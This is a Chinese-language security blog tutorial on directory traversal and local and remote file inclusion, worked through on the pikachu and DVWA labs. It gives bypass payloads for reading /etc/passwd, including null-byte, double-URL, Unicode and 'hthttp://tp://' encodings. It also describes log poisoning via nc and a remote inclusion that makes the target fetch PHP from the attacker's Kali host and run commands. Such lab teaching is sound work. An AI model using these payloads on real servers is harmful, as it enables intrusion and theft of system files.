---
title: 目录遍历
date: 2021-02-20 21:11:55
categories:
- 安全
tags:
- 渗透
typora-root-url: ./
---

# 目录遍历漏洞概述

 在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。   

<!-- more -->                   

看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。                    

需要区分一下的是,如果你通过不带参数的url（比如：http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。 而并不归为目录遍历漏洞。（关于敏感信息泄露你你可以在"i can see you ABC"中了解更多）你可以通过“../../”对应的测试栏目，来进一步的了解该漏洞。 

## pikaqiu靶机实践                   

![image-20200902215534791](/blog.github.io/images/image-20200902215534791.png)

### (1) 加密参数传递的数据；

在Web应用程序对文件名进行加密之后再提交，比如：“downfile.jsp?filename= ZmFuLnBkZg- “，在参数filename用的是Base64加密，而攻击者要想绕过，只需简单的将文件名加密后再附加提交即可。所以说，采用一些有规律或者轻易能识别的加密方式，也是存在风险的。

### (2) 编码绕过，

尝试使用不同的编码转换进行过滤性的绕过，比如Url编码，通过对参数进行Url编码提交，“downfile.jsp?filename= %66%61%6E%2E%70%64%66“来绕过。

### (3) 目录限定绕过；

在有些Web应用程序是通过限定目录权限来分离的。当然这样的方法不值得可取的，攻击者可以通过某些特殊的符号“~“来绕过。形如这样的提交“downfile.jsp?filename=~/../boot”。能过这样一个符号，就可以直接跳转到硬盘目录下了。

### (4) 绕过文件后缀过滤；

一些Web应用程序在读取文件前，会对提交的文件后缀进行检测，攻击者可以在文件名后放一个空字节的编码，来绕过这样的文件类型的检查。
例如：../../../../boot.ini%00.jpg，Web应用程序使用的Api会允许字符串中包含空字符，当实际获取文件名时，则由系统的Api会直接截短，而解析为“../../../../boot.ini”。
在类Unix的系统中也可以使用Url编码的换行符，例如：../../../etc/passwd%0a.jpg如果文件系统在获取含有换行符的文件名，会截短为文件名。也可以尝试%20，例如: ../../../index.jsp%20

### (5) 绕过来路验证。

Http Referer : HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的

在一些Web应用程序中，会有对提交参数的来路进行判断的方法，而绕过的方法可以尝试通过在网站留言或者交互的地方提交Url再点击或者直接修改Http Referer即可，这主要是原因Http Referer是由客户端浏览器发送的，服务器是无法控制的，而将此变量当作一个值得信任源是错误的。

## 防范遍历路径漏洞

在防范遍历路径漏洞的方法中，最有效的是权限的控制，谨慎的处理向文件系统API传递过来的参数路径。主要是因为大多数的目录或者文件权限均没有得到合理的配置，而Web应用程序对文件的读取大多依赖于系统本身的API，在参数传递的过程，如果没有得严谨的控制，则会出现越权现象的出现。在这种情况下，Web应用程序可以采取以下防御方法，最好是组合使用。
(1) 数据净化对网站用户提交过来的文件名进行硬编码或者统一编码，对文件后缀进行白名单控制，对包含了恶意的符号或者空字节进行拒绝。
(2) Web应用程序可以使用chrooted环境访问包含被访问文件的目录，或者使用绝对路径+参数来控制访问目录，使其即使是越权或者跨越目录也是在指定的目录下。

## 总结

路径遍历漏洞允许恶意攻击者突破Web应用程序的安全控制，直接访问攻击者想要的敏感数据 ，包括配置文件、日志、源代码等，配合其它漏洞的综合利用，攻击者可以轻易的获取更高的权限，并且这样的漏洞在发掘上也是很容易的，只要对Web应用程序的读写功能块直接手工检测，通过返回的页面内容来判断，是很直观的，利用起来也相对简单。

## 还有一种目录遍历 那就是因为这个web服务器的配置不当造成的

index of /

我们可以直接利用百度语法来寻找此形式的目录遍历漏洞

intitle:index of

## **目录遍历漏洞：**

**应用程序如果有操作文件的功能，限制不严格会导致可以访问到WEB目录意外的文件**

目录遍历漏洞和文件包含漏洞本质以及利用方法一样

一定要论区别的话：

**目录遍历：对本操作系统的文件进行读取**

**文件包含：1:LFI本地文件包含，和目录遍历一致；2:RFI远程文件包含**

漏洞原因：目录权限限制不严格

### 漏洞利用示例：

启动Metasploitable靶机：192.168.163.129

启动Kali机器：192.168.163.132

 

在DVWA的这个目录存在文件包含漏洞：本地文件包含

![img](/blog.github.io/images/1312707-20181122122837602-2091062644.png)

 

我们可以在Metasploitable中修改配置文件以开启远程文件包含漏洞：

sudo vi /etc/php5/cgi/php.ini

然后输入/allow_url进行搜索：找到这里，修改成On

![img](/blog.github.io/images/1312707-20181122124418190-866071858.png)

然后重启Apache服务：

sudo /etc/init.d/apache2 restart

这时候Metasploitable就会存在远程文件包含漏洞了

 

### 目录遍历漏洞的特征要注意：

?page=xxx.php

?home=xxx.html

?index=xxx.jsp

?file=content

 

### 常用漏洞验证方式：

#### 1：../../../../../../（多少个../都行，越多越好）/etc/passwd

![img](/blog.github.io/images/1312707-20181122125924263-1282240920.png)

 

URL上这一串东西的意义：../返回上级目录，当返回到根目录时候再../还是根目录，然后直接进入linux系统的passwd文件

 

#### 2.file:///etc/passwd（这里是文件包含漏洞，不过利用方法一致）

![img](/blog.github.io/images/1312707-20181122130527658-1607236601.png)

 

#### 3.http://xxxxx

![img](/blog.github.io/images/1312707-20181122130838887-1451696930.png)

 

前两者用途：可以读取到目标系统的机密文件

远程文件包含用途：可以构建一个带有shellcode的网站，使目标访问，进而得到shell（虽然是低权限shell）

 

###  **注意事项：**

1.有时候?page=../../../etc/passwd，显示找不到passwd.php文件，这是目标系统开启了过滤机制

绕过办法：PHP5.3版本以前的，可以用一个空字符%00来解决，示例：

?page=../../../etc/passwd%00

这时候就算目标机器补上一个.php，也无所谓

 

2.有的服务器会过滤非法字符，比如/\$&.*等，我们可以采用一些编码来处理

路径方面，linux一定是/，windows通常是\，但有可能是/，实际中可以多次发送根据结果来得到答案

编码方面：示例

URL编码：

../   %2e%2e%2f

..\   %2e%2e%5c

..\   %252e%252e%255c (双层URL编码)

 

Unicode/UTF-8编码：

../   ..%c0%af   ..%u2216  

..\   ..%c1%9c

 

编码工具：之前介绍的很多工具都有，我用Burp来举例

![img](/blog.github.io/images/1312707-20181122133015851-1125383547.png)

 

可以用URL编码后的字符做尝试：成功

![img](/blog.github.io/images/1312707-20181122133210352-467797778.png)

 

![img](/blog.github.io/images/1312707-20181122134458649-191668887.png)

 

上边说到本地文件包含来查看文件内容

**通常认为本地文件包含漏洞无法执行代码**

万事没有绝对，有极其特殊的方式可以执行代码

**比如：利用访问日志**

当我们访问一个WebServer例如Apache时候，就会有访问日志

会记录下来访问IP和访问的URL等一些简单的信息

我们用nc连接到目标的80端口：发送一段这样的东西

 ![img](/blog.github.io/images/1312707-20181122141734563-3569581.png)

 

然后会在apache的日志中插入一段php代码：然后对日志文件chmod，改为可执行权限

如果失败了的话，多层chmod，使访问目录的所有层都赋予权限，然后利用文件包含，有机会执行代码（不一定成功）

 

### **远程文件包含示例：**

我先用NC侦听本地80端口：

![img](/blog.github.io/images/1312707-20181122143815332-62297210.png)

 

远程文件包含到Kali机器：这是输入Kali的IP，至于URL随便写

![img](/blog.github.io/images/1312707-20181122144007682-1299164782.png)

 

然后一直显示连接状态

查看NC，发现收到了连接请求：

![img](/blog.github.io/images/1312707-20181122144141057-1872866535.png)

 

nc只是获得了连接请求，实际没用

下面展示实际使用方式

利用Kali本机的Apache服务

到/var/www/html目录下，新建文本 1.txt，写入上边的php代码（或者搞个木马脚本都行，这里为了方便）

![img](/blog.github.io/images/1312707-20181122150243793-1463425658.png)

 

保存之后开启Apache服务

![img](/blog.github.io/images/1312707-20181122150430950-1173938752.png)

 

然后测试：

![img](/blog.github.io/images/1312707-20181122150717616-874695890.png) 

 

成功执行了ls命令

到这一步就相当于拿到了shell

 

最后：

我们可以查看DVWA这里的远程文件包含的源码：

LOW级别：直接获取文件名

```
 <?php

    $file = $_GET['page']; //The page we wish to display 

?> 
```

 

MEDIUM级别：过滤特殊字符，导致无法远程文件包含

解决方法：编码

比如http://192.168.163.132======>%68%74%74%70%3a%2f%2f192.168.163.132

如果失败，就可以只针对http://中的某个字符，比如/进行编码

如果还是失败，可以进行一种巧妙的方法

**非常经典的关键字绕过方法：**

**hthttp://tp://192.168.163.132**

我在一个http://中插入了一个http://，**服务器只会识别一次**，如果两个分开写都会被过滤，**穿插来写**，只会过滤一个

```
 <?php

    $file = $_GET['page']; // The page we wish to display 

    // Bad input validation
    $file = str_replace("http://", "", $file);
    $file = str_replace("https://", "", $file);        


?> 
```

HIGH级别：规定写死，只能包含include.php

这种方式基本无解了，没有漏洞，或者我水平低下找不到漏洞

```
 <?php
        
    $file = $_GET['page']; //The page we wish to display 

    // Only allow include.php
    if ( $file != "include.php" ) {
        echo "ERROR: File not found!";
        exit;
    }
        
?> 
```

总结：

远程文件包含漏洞出现概率远远小于本地文件包含漏洞

但是远程文件包含漏洞更容易被利用